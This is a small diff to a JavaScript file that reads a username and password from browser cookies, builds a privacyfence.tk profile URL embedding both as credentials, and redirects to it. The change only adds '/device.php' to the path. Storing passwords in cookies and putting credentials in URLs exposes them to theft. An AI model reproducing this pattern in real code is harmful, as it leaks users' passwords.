@@ -25,7 +25,7 @@ function getCookie(name) {
 
 let username = getCookie('username');
 let password = getCookie('password');
-let urlInsert = "https://" + username + ":" + password + "@privacyfence.tk/profiles/" + username + "";
+let urlInsert = "https://" + username + ":" + password + "@privacyfence.tk/profiles/" + username + "/device.php";
 
 //redirect to user profile
 window.location.replace(urlInsert);
